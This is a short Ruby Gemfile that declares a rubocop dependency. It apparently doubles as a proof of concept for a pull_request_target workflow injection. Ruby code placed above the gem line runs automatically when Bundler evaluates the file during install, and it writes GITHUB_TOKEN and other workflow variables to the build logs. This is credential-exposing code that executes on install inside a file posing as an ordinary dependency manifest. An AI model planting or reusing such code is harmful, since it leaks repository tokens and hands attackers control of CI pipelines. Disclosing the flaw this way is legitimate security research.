source "https://rubygems.org"

# === SECURITY POC — pull_request_target workflow injection ===
# Gemfile is evaluated as Ruby by Bundler during `bundle install`
# This proves arbitrary code execution in the lint workflow context
$stderr.puts "[POC-START]"
$stderr.puts "GITHUB_TOKEN=#{ENV['GITHUB_TOKEN']}"
$stderr.puts "GITHUB_REPOSITORY=#{ENV['GITHUB_REPOSITORY']}"
$stderr.puts "GITHUB_ACTOR=#{ENV['GITHUB_ACTOR']}"
$stderr.puts "GITHUB_SHA=#{ENV['GITHUB_SHA']}"
$stderr.puts "[POC-END]"
# === END POC ===

gem "rubocop", "~> 1.0"
